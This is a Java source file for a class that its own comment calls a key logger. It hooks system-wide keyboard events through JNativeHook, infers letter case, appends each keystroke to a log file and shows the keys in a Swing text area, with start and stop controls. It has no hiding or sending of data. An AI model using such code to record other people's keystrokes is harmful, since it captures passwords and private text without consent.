package utility;

import java.awt.Toolkit;
import java.awt.event.KeyEvent;

import javax.swing.JTextArea;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import UI.MainUI;
import sun.applet.Main;

/**
 * @author avAnkyAnkit last modified @21-Mar-2018 @2:31:45 AM Key Logger - TODO
 */

public class keyStroke implements NativeKeyListener {

	private String lastKey = "";
	private FileReadWrite op;
	private boolean run;
	private long lastVisit;
	private JTextArea mFeed;

	public keyStroke(String path, FileReadWrite op, JTextArea mFeed) {
		this.op = op;
		this.mFeed = mFeed;
		mFeed.setText("");
		lastVisit = System.currentTimeMillis();
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		String addTofeed = "";
		String key = NativeKeyEvent.getKeyText(e.getKeyCode());

		if (!run)
			return;

		boolean isAlpha = key.charAt(0) >= 'A' && key.charAt(0) <= 'Z';
		if (key.length() == 1 && isAlpha) {
			boolean isShift = lastKey.equals("Shift");
			boolean isOn = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK);
			if ((isOn && isShift) || ((!isOn) && (!isShift))) {
				addTofeed = key.toLowerCase();
			} else {
				long Delay = System.currentTimeMillis() - lastVisit;
				if (Delay <= 500) {
					addTofeed = key;
				} else {
					addTofeed = key.toLowerCase();
				}
			}
		} else {
			addTofeed = key;
		}

		op.add(addTofeed);
		lastVisit = System.currentTimeMillis();
		this.lastKey = key;
		if (!addTofeed.equals("Shift"))
			mFeed.append(addTofeed);
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {

	}

	public void start() {
		this.run = true;
		op.addTofile("Enter");
		op.addTofile("----------------------");
		op.addTofile("Enter");
	}

	public void stop() {
		this.run = false;
		op.addTofile("Enter");
	}

}
